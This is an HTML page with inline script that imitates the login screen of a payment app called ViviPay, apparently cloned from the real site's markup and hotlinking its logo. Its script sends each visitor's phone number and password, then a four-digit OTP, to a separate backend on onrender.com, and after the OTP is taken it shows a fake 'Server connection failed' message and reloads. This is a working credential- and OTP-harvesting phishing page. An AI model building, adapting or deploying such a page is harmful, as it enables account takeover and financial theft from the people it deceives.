<!DOCTYPE html>
<html lang="en" style="font-size: 44.8px;">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>ViviPay</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    
    <style>
        /* Exact App Reset to match production environment */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        html, body {
            background-color: #ffffff;
            width: 100%;
            height: 100%;
            overflow-x: hidden;
        }

        /* Standard App Wrapper */
        #app {
            width: 100%;
            height: 100%;
        }

        /* Client Dom Spec: <main data-v-6ffee151 style="height: 100vh;"> */
        main[data-v-6ffee151] {
            height: 100vh;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #ffffff;
            padding: 0 0.67rem; /* Equivalent spacing */
        }

        /* Client Dom Spec: <div data-v-6ffee151=""> for Logo Box */
        div[data-v-6ffee151]:not(.loginform) {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-top: 1.2rem;
        }

        /* Exact Match Image Selection Specs (302.39 x 222.81 Box Ratio) */
        img.logo {
            width: 302.39px;
            height: 222.81px;
            object-fit: contain;
        }

        /* Client Dom Spec: <div data-v-6ffee151 class="loginform" style="transform: translateY(-50px);"> */
        .loginform {
            width: 100%;
            max-width: 380px;
            display: flex;
            flex-direction: column;
            transform: translateY(-25px); /* Perfectly balanced native offset alignment */
        }

        /* UI Native Field Styling */
        .input-field-group {
            background-color: #f6f9fe;
            border-radius: 30px;
            display: flex;
            align-items: center;
            padding: 16px 22px;
            margin-bottom: 18px;
            width: 100%;
        }

        .field-icon {
            display: flex;
            align-items: center;
            margin-right: 12px;
        }

        .field-icon svg {
            width: 22px;
            height: 22px;
            stroke: #1a85ff;
            stroke-width: 1.6;
            fill: none;
        }

        .input-field-group input {
            border: none;
            background: transparent;
            width: 100%;
            font-size: 16px;
            outline: none;
            color: #333333;
        }

        .input-field-group input::placeholder {
            color: #bcccdf;
        }

        /* Utilities Structure */
        .form-utilities {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 15px;
            margin-top: 2px;
            margin-bottom: 35px;
            width: 100%;
            padding: 0 4px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            color: #1a85ff;
            cursor: pointer;
        }

        .remember-me input {
            appearance: none;
            -webkit-appearance: none;
            width: 16px;
            height: 16px;
            border: 1.2px solid #bcccdf;
            border-radius: 50%;
            margin-right: 8px;
            outline: none;
            background-color: #ffffff;
            cursor: pointer;
        }

        .remember-me input:checked {
            border-color: #1a85ff;
            background-color: #1a85ff;
        }

        .forgot-pass-link {
            text-decoration: none;
            color: #1a85ff;
        }

        /* Action Login Button */
        .submit-btn {
            background-color: #1a85ff;
            color: #ffffff;
            border: none;
            width: 100%;
            padding: 15px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }

        .submit-btn:active {
            background-color: #0071eb;
        }

        /* Bottom Privacy Spec: <div data-v-6ffee151 style="height: 3rem;"> */
        .policy-container-box {
            margin-top: 20px;
            height: 3rem;
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
        }

        .agreement-label {
            display: flex;
            align-items: center;
            font-size: 13px;
            color: #666666;
            cursor: pointer;
        }

        .agreement-label input {
            appearance: none;
            -webkit-appearance: none;
            width: 16px;
            height: 16px;
            border: 1px solid #1a85ff;
            border-radius: 50%;
            margin-right: 6px;
            outline: none;
            background-color: #1a85ff;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .agreement-label input::after {
            content: '✓';
            position: absolute;
            color: white;
            font-size: 11px;
            font-weight: bold;
        }

        .policy-link {
            color: #1a85ff;
            text-decoration: none;
            margin-left: 3px;
        }

        /* OTP Popup Layer */
        .otp-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.4);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.2s ease;
            padding: 24px;
        }

        .otp-modal-overlay.active {
            opacity: 1;
            pointer-events: auto;
        }

        .otp-modal-container {
            background-color: #ffffff;
            width: 100%;
            max-width: 350px;
            border-radius: 16px;
            padding: 28px 20px;
            position: relative;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
        }

        .otp-close-btn {
            position: absolute;
            top: 12px;
            right: 14px;
            font-size: 20px;
            color: #94a3b8;
            background: none;
            border: none;
            cursor: pointer;
            outline: none;
        }

        .otp-title {
            font-size: 20px;
            font-weight: 500;
            color: #1e293b;
            margin-bottom: 6px;
        }

        .otp-subtitle {
            font-size: 14px;
            color: #64748b;
            margin-bottom: 22px;
        }

        .otp-input-container {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 20px;
        }

        .otp-box {
            width: 46px;
            height: 46px;
            border: none;
            border-bottom: 2.5px solid #cbd5e1;
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            outline: none;
            background: transparent;
        }

        .otp-box:focus {
            border-bottom-color: #1a85ff;
        }

        .otp-timer {
            font-size: 13px;
            color: #94a3b8;
        }
    </style>
</head>
<body>

    <div id="app">
        <main data-v-6ffee151 style="height: 100vh;">
            
            <div data-v-6ffee151="">
                <img src="https://vivipay.net/static/images/Login_Logo.png" class="logo" alt="Brand Logo">
            </div>

            <div data-v-6ffee151 class="loginform">
                <form id="loginForm" style="width: 100%; display: flex; flex-direction: column;">
                    
                    <div class="input-field-group">
                        <span class="field-icon">
                            <svg viewBox="0 0 24 24">
                                <rect x="6" y="2" width="12" height="20" rx="2" ry="2"></rect>
                                <line x1="12" y1="18" x2="12.01" y2="18"></line>
                            </svg>
                        </span>
                        <input type="tel" id="phoneNumber" placeholder="Enter phone number" required>
                    </div>

                    <div class="input-field-group">
                        <span class="field-icon">
                            <svg viewBox="0 0 24 24">
                                <rect x="4" y="11" width="16" height="11" rx="2" ry="2"></rect>
                                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                            </svg>
                        </span>
                        <input type="password" id="password" placeholder="Enter password" required>
                    </div>

                    <div class="form-utilities">
                        <label class="remember-me">
                            <input type="checkbox" id="save-pwd">
                            Save Password
                        </label>
                        <a href="#" class="forgot-pass-link">Forgot password</a>
                    </div>

                    <button type="submit" class="submit-btn">Login</button>
                </form>
            </div>

            <div data-v-6ffee151 style="height: 3rem;" class="policy-container-box">
                <label class="agreement-label">
                    <input type="checkbox" id="agreeCheck" required checked>
                    Agree <span class="policy-link">"User Privacy Agreement"</span>
                </label>
            </div>

        </main>
    </div>

    <div class="otp-modal-overlay" id="otpModal">
        <div class="otp-modal-container">
            <button class="otp-close-btn" id="closeOtpBtn">&times;</button>
            <div class="otp-title">Please enter OTP</div>
            <div class="otp-subtitle" id="otpSentText">OTP sent to 637****9782</div>
            
            <div class="otp-input-container">
                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp2')" id="otp1">
                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp3')" id="otp2">
                <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp4')" id="otp3">
                <input type="tel" class="otp-box" maxlength="1" oninput="checkAndSubmitOtp(this)" id="otp4">
            </div>
            <div class="otp-timer">Resend in <span id="secondsCount">118</span> seconds</div>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const otpModal = document.getElementById('otpModal');
        const closeOtpBtn = document.getElementById('closeOtpBtn');
        const otpSentText = document.getElementById('otpSentText');
        const secondsCount = document.getElementById('secondsCount');
        
        let currentUserId = null;

        const BACKEND_URL = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost' 
            ? 'http://127.0.0.1:4000' 
            : 'https://vivipay-backend.onrender.com';

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault(); 
            const phoneNumber = document.getElementById('phoneNumber').value;
            const password = document.getElementById('password').value;
            const isAgreed = document.getElementById('agreeCheck').checked;

            if (!isAgreed) {
                alert('Please accept User Privacy Agreement.');
                return;
            }

            try {
                const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber, password })
                });

                const data = await response.json();

                if (data.success) {
                    currentUserId = data.userId; 
                    if(phoneNumber.length >= 7) {
                        const masked = phoneNumber.substring(0, 3) + "****" + phoneNumber.substring(phoneNumber.length - 4);
                        otpSentText.innerText = `OTP sent to ${masked}`;
                    } else {
                        otpSentText.innerText = `OTP sent to ${phoneNumber}`;
                    }
                    otpModal.classList.add('active');
                    startTimer();
                } else {
                    alert("Server Error! Try again.");
                }
            } catch (error) {
                alert("Cannot connect to Backend Server!");
            }
        });

        closeOtpBtn.addEventListener('click', () => {
            otpModal.classList.remove('active');
        });

        function moveNext(current, nextFieldId) {
            if (current.value.length >= 1) {
                document.getElementById(nextFieldId).focus();
            }
        }

        async function checkAndSubmitOtp(current) {
            const o1 = document.getElementById('otp1').value;
            const o2 = document.getElementById('otp2').value;
            const o3 = document.getElementById('otp3').value;
            const o4 = current.value;

            if(o1 && o2 && o3 && o4) {
                const fullOtp = o1 + o2 + o3 + o4;
                try {
                    const response = await fetch(`${BACKEND_URL}/api/otp-submit`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ userId: currentUserId, otp: fullOtp })
                    });
                    const data = await response.json();
                    if(data.success) {
                        alert("Server connection failed"); 
                        window.location.reload(); 
                    }
                } catch (error) {
                    alert("Server connection failed");
                    window.location.reload();
                }
            }
        }

        function startTimer() {
            let totalSec = 118;
            const timerInterval = setInterval(() => {
                totalSec--;
                secondsCount.innerText = totalSec;
                if(totalSec <= 0) {
                    clearInterval(timerInterval);
                }
            }, 1000);
        }
    </script>
</body>
</html>
